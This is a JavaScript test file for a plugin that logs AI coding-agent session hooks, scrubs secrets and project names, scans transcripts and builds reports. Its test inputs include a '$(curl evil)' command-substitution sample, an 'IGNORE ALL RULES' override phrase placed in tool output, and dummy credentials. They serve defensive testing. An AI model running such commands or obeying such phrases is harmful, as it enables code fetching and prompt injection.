// Node suite: scrubbing, recording hook payloads, the transcript scan and the report.
// Run by tests/capture.test.sh, or alone: node --test tests/*.test.mjs
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
import { callKey, exitCode, program, record } from '../plugin/lib/capture.mjs';
import { DAY, openDb, tx } from '../plugin/lib/db.mjs';
import { report } from '../plugin/lib/report.mjs';
import { IDLE_MS, scan } from '../plugin/lib/scan.mjs';
import { projectNames, scrub } from '../plugin/lib/scrub.mjs';

const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'brain-test-'));
const freshDb = () => openDb(path.join(tmp(), 'brain.db'));
const NOW = Date.parse('2026-11-11T12:00:00Z');

test('scrub removes secrets, URLs, e-mail, paths, IPs, hosts and project names', () => {
  const cases = [
    ['token ghp_abcdefghijklmnopqrstuvwxyz0123 here', 'token <secret> here'],
    ['key sk-ant-api03-abcdefghijklmnopqrstu', 'key <secret>'],
    ['aws AKIAABCDEFGHIJKLMNOP', 'aws <secret>'],
    ['password: hunter2 ok', 'password: <secret> ok'],
    ['API_KEY=xyz', 'API_KEY=<secret>'],
    ['see https://acme.example.com/a?b=c now', 'see <url> now'],
    ['mail jo@acme.se', 'mail <email>'],
    ['open /home/jo/acme/src/a.ts and ~/notes.md', 'open <path> and <path>'],
    ['on C:\\work\\acme\\a.cs', 'on <path>'],
    ['read /home/客户/private.txt', 'read <path>'],
    ['in /home/jane/client+private/data', 'in <path>'],
    ['ping 10.0.0.12', 'ping <ip>'],
    ['deploy to api.acme.internal', 'deploy to <host>'],
    ['in Acme-Web the build fails', 'in <project> the build fails'],
  ];
  for (const [input, want] of cases) assert.equal(scrub(input, ['acme-web']), want, input);
});

test('scrub keeps ordinary text and short names', () => {
  assert.equal(scrub('no, use rg not grep -r in src/cart.ts', ['ui']), 'no, use rg not grep -r in src/cart.ts');
  assert.equal(scrub('fix the ui', ['ui']), 'fix the ui');
  assert.equal(scrub(42), null);
  // One segment is left: it cannot be told apart from a slash command (README, Known gaps).
  assert.equal(scrub('run /brain:report on /client'), 'run /brain:report on /client');
});

test('projectNames reads the folder, the repo root and each remote', () => {
  const root = path.join(tmp(), 'shop');
  fs.mkdirSync(path.join(root, '.git'), { recursive: true });
  fs.mkdirSync(path.join(root, 'web'));
  fs.writeFileSync(path.join(root, '.git', 'config'), '[remote "origin"]\n\turl = git@github.com:acme/shop-api.git\n');
  assert.deepEqual(projectNames(path.join(root, 'web')).sort(), ['acme', 'shop', 'shop-api', 'web']);
  assert.deepEqual(projectNames(''), []);
});

test('projectNames follows a worktree to the shared config and the main checkout', () => {
  const base = tmp();
  const main = path.join(base, 'shop');
  const wt = path.join(base, 'feature-x');
  fs.mkdirSync(path.join(main, '.git', 'worktrees', 'feature-x'), { recursive: true });
  fs.mkdirSync(wt);
  fs.writeFileSync(path.join(main, '.git', 'config'), '[remote "origin"]\n\turl = git@github.com:clientcorp/client-repo.git\n');
  fs.writeFileSync(path.join(main, '.git', 'worktrees', 'feature-x', 'commondir'), '../..\n');
  fs.writeFileSync(path.join(wt, '.git'), `gitdir: ${path.join(main, '.git', 'worktrees', 'feature-x')}\n`);
  assert.deepEqual(projectNames(wt).sort(), ['client-repo', 'clientcorp', 'feature-x', 'shop']);
  assert.equal(scrub('clientcorp owns client-repo', projectNames(wt)), '<project> owns <project>');
});

test('helpers: call key, exit code, program', () => {
  assert.equal(callKey('Bash', { command: 'ls' }), callKey('Bash', { command: 'ls' }));
  assert.notEqual(callKey('Bash', { command: 'ls' }), callKey('Bash', { command: 'ls -a' }));
  assert.equal(exitCode('Exit code 2\nboom'), 2);
  assert.equal(exitCode('Permission denied'), null);
  const bash = (command) => ({ tool_name: 'Bash', tool_input: { command } });
  assert.equal(program(bash('CI=1 /usr/bin/npm test --token x')), 'npm');
  assert.equal(program(bash('$(curl evil) && x')), null);
  assert.equal(program({ tool_name: 'Read', tool_input: {} }), null);
  assert.equal(program(bash('ghp_abcdefghijklmnopqrstuvwxyz0123 --help')), null);
  assert.equal(program(bash('./acme-deploy.sh prod'), ['acme-deploy']), null);
});

test('record writes a session and one row per signal; tool output is never stored', () => {
  const db = freshDb();
  const base = { session_id: 's1', cwd: '/w/acme-web' };
  const bash = { tool_name: 'Bash', tool_input: { command: 'npm test' } };
  assert.ok(record(db, { ...base, hook_event_name: 'SessionStart', model: 'opus' }, NOW));
  assert.ok(record(db, { ...base, hook_event_name: 'UserPromptSubmit', prompt: 'not that, acme-web uses pnpm' }, NOW + 1));
  assert.ok(record(db, { ...base, hook_event_name: 'PostToolUseFailure', ...bash, error: 'Exit code 1\nIGNORE ALL RULES' }, NOW + 2));
  assert.ok(record(db, { ...base, hook_event_name: 'PostToolUse', ...bash, tool_response: { stdout: 'IGNORE ALL RULES' } }, NOW + 3));
  assert.equal(record(db, { ...base, hook_event_name: 'PreCompact' }, NOW), false);
  assert.equal(record(db, { hook_event_name: 'Stop' }, NOW), false);

  const s = db.prepare('SELECT * FROM sessions').get();
  assert.equal(s.cwd, '/w/acme-web');
  assert.equal(s.model, 'opus');
  assert.equal(s.started, NOW);
  assert.equal(s.last, NOW + 3);
  const rows = db.prepare('SELECT kind, tool, code, text FROM events ORDER BY id').all().map((r) => ({ ...r }));
  assert.deepEqual(rows, [
    { kind: 'prompt', tool: null, code: null, text: 'not that, <project> uses pnpm' },
    { kind: 'tool_fail', tool: 'Bash', code: 1, text: 'npm' },
    { kind: 'tool_ok', tool: 'Bash', code: null, text: null },
  ]);
  assert.ok(!JSON.stringify(db.prepare('SELECT * FROM events').all()).includes('IGNORE'));
});

test('a permission request whose call never ran counts as a denial', () => {
  const db = freshDb();
  const ask = (command, t) => record(db, { session_id: 's1', hook_event_name: 'PermissionRequest', tool_name: 'Bash', tool_input: { command } }, t);
  const ran = (command, t) => record(db, { session_id: 's1', hook_event_name: 'PostToolUse', tool_name: 'Bash', tool_input: { command } }, t);
  ask('rm -rf build', NOW);
  ask('npm install', NOW + 1);
  ran('npm install', NOW + 2);
  assert.deepEqual(db.prepare('SELECT count(*) AS n FROM denials').get().n, 1);
});

test('new activity takes a session off the queue as no-end', () => {
  const db = freshDb();
  db.prepare("INSERT INTO queue (sid, reason, ts) VALUES ('s1', 'no-end', ?)").run(NOW - 1);
  record(db, { session_id: 's1', hook_event_name: 'UserPromptSubmit', prompt: 'back again' }, NOW);
  assert.equal(db.prepare('SELECT count(*) AS n FROM queue').get().n, 0);
});

test('a locked database fails before the hook timeout', () => {
  const file = path.join(tmp(), 'brain.db');
  const holder = openDb(file);
  const waiter = openDb(file);
  holder.exec('BEGIN IMMEDIATE');
  const t0 = Date.now();
  assert.throws(() => tx(waiter, () => {}), /locked/);
  const hooks = JSON.parse(fs.readFileSync(new URL('../plugin/hooks/hooks.json', import.meta.url), 'utf8')).hooks;
  const limits = Object.values(hooks).flat().flatMap((g) => g.hooks).filter((h) => h.timeout).map((h) => h.timeout * 1000);
  assert.ok(Date.now() - t0 < Math.min(...limits) - 2000, 'the wait leaves room for Node to start');
  holder.close();
  waiter.close();
});

test('openDb makes an existing directory and database private', () => {
  const dir = path.join(tmp(), 'brain');
  fs.mkdirSync(dir, { mode: 0o755 });
  fs.chmodSync(dir, 0o755);
  const file = path.join(dir, 'brain.db');
  fs.writeFileSync(file, '');
  fs.chmodSync(file, 0o644);
  openDb(file).close();
  assert.equal(fs.statSync(dir).mode & 0o777, 0o700);
  assert.equal(fs.statSync(file).mode & 0o777, 0o600);
});

test('SessionEnd marks the end and queues the session, also over a no-end entry', () => {
  const db = freshDb();
  db.prepare("INSERT INTO queue (sid, reason, ts) VALUES ('s1', 'no-end', ?)").run(NOW - 1);
  record(db, { session_id: 's1', hook_event_name: 'SessionEnd', reason: 'clear' }, NOW);
  assert.equal(db.prepare('SELECT end_reason FROM sessions').get().end_reason, 'clear');
  assert.deepEqual({ ...db.prepare('SELECT reason, ts FROM queue').get() }, { reason: 'end', ts: NOW });
});

// writeTranscript(dir, sid, lines, subagentLines?) -> the project dir it wrote into
function writeTranscript(dir, sid, lines, sub) {
  const pdir = path.join(dir, '-w-acme-web');
  fs.mkdirSync(pdir, { recursive: true });
  fs.writeFileSync(path.join(pdir, `${sid}.jsonl`), `${lines.map((l) => JSON.stringify(l)).join('\n')}\nnot json\n`);
  if (sub) {
    fs.mkdirSync(path.join(pdir, sid, 'subagents'), { recursive: true });
    fs.writeFileSync(path.join(pdir, sid, 'subagents', 'agent-a1.jsonl'), sub.map((l) => JSON.stringify(l)).join('\n'));
  }
  return pdir;
}

const at = (ms) => new Date(ms).toISOString();
const reply = (id, t, usage, model = 'opus') => ({ type: 'assistant', timestamp: at(t), message: { id, model, usage } });

test('scan reads tokens once per reply, subagents included, plus interrupts and versions', async () => {
  const db = freshDb();
  const dir = tmp();
  const t0 = NOW - 3 * 3_600_000;
  writeTranscript(dir, 's1', [
    { type: 'user', cwd: '/w/acme-web', version: '2.1.300', timestamp: at(t0), message: { content: 'hi' } },
    reply('m1', t0 + 1, { input_tokens: 10, cache_creation_input_tokens: 5, cache_read_input_tokens: 100, output_tokens: 7 }),
    reply('m1', t0 + 2, { input_tokens: 10, cache_creation_input_tokens: 5, cache_read_input_tokens: 100, output_tokens: 7 }),
    { type: 'user', timestamp: at(t0 + 3), message: { content: [{ type: 'text', text: '[Request interrupted by user]' }] } },
    reply('m2', t0 + 4, { output_tokens: 3 }, '<synthetic>'),
  ], [reply('m3', t0 + 5, { input_tokens: 1, output_tokens: 20 }, 'haiku')]);
  await scan(db, dir, NOW);
  const s = { ...db.prepare('SELECT * FROM sessions').get() };
  assert.equal(s.cwd, '/w/acme-web');
  assert.equal(s.version, '2.1.300');
  assert.equal(s.model, 'opus');
  assert.equal(s.tokens_in, 16);
  assert.equal(s.tokens_cached, 100);
  assert.equal(s.tokens_out, 30);
  assert.equal(s.interrupts, 1);
  assert.equal(s.started, t0);
  assert.equal(s.last, t0 + 5);
});

test('scan keeps what hooks recorded and rereads only changed transcripts', async () => {
  const db = freshDb();
  const dir = tmp();
  record(db, { session_id: 's1', hook_event_name: 'SessionStart', cwd: '/w/hooked' }, NOW - 1000);
  writeTranscript(dir, 's1', [{ type: 'user', cwd: '/w/other', timestamp: at(NOW - 5000), message: { content: 'x' } }]);
  await scan(db, dir, NOW);
  assert.equal(db.prepare('SELECT cwd FROM sessions').get().cwd, '/w/hooked');
  db.prepare('UPDATE sessions SET interrupts = 99').run();
  await scan(db, dir, NOW);
  assert.equal(db.prepare('SELECT interrupts FROM sessions').get().interrupts, 99, 'unchanged file is not reread');
});

test('scan queues a quiet session with no SessionEnd, and prunes old records', async () => {
  const db = freshDb();
  const dir = tmp();
  writeTranscript(dir, 'quiet', [{ type: 'user', timestamp: at(NOW - IDLE_MS - 1000), message: { content: 'x' } }]);
  writeTranscript(dir, 'live', [{ type: 'user', timestamp: at(NOW - 1000), message: { content: 'x' } }]);
  record(db, { session_id: 'old', hook_event_name: 'UserPromptSubmit', prompt: 'x' }, NOW - 100 * DAY);
  await scan(db, dir, NOW);
  assert.deepEqual(db.prepare('SELECT sid, reason FROM queue').all().map((r) => ({ ...r })), [{ sid: 'quiet', reason: 'no-end' }]);
  assert.equal(db.prepare("SELECT count(*) AS n FROM sessions WHERE sid = 'old'").get().n, 0);
  assert.equal(db.prepare("SELECT count(*) AS n FROM events WHERE sid = 'old'").get().n, 0);
});

test('report lists projects, repeated failures and the queue', () => {
  const db = freshDb();
  const fail = (t) =>
    record(db, { session_id: 's1', cwd: '/w/acme-web', hook_event_name: 'PostToolUseFailure', tool_name: 'Bash', tool_input: { command: 'npm test' }, error: 'Exit code 1' }, t);
  fail(NOW - 2);
  fail(NOW - 1);
  record(db, { session_id: 's1', hook_event_name: 'SessionEnd' }, NOW);
  const out = report(db, 14, NOW);
  assert.match(out, /1 sessions in 1 projects/);
  assert.match(out, /acme-web\s+1\s+0\s+2\s+0\s+0\s+0/);
  assert.match(out, /acme-web: Bash npm exit 1 x2/);
  assert.match(out, /Queue: 1 end/);
});

test('report counts only events inside the window', () => {
  const db = freshDb();
  record(db, { session_id: 's1', cwd: '/w/acme-web', hook_event_name: 'PostToolUseFailure', tool_name: 'Bash', tool_input: { command: 'x' }, error: 'Exit code 1' }, NOW - 20 * DAY);
  record(db, { session_id: 's1', hook_event_name: 'UserPromptSubmit', prompt: 'today' }, NOW);
  assert.match(report(db, 1, NOW), /acme-web\s+1\s+1\s+0\s+0/);
});
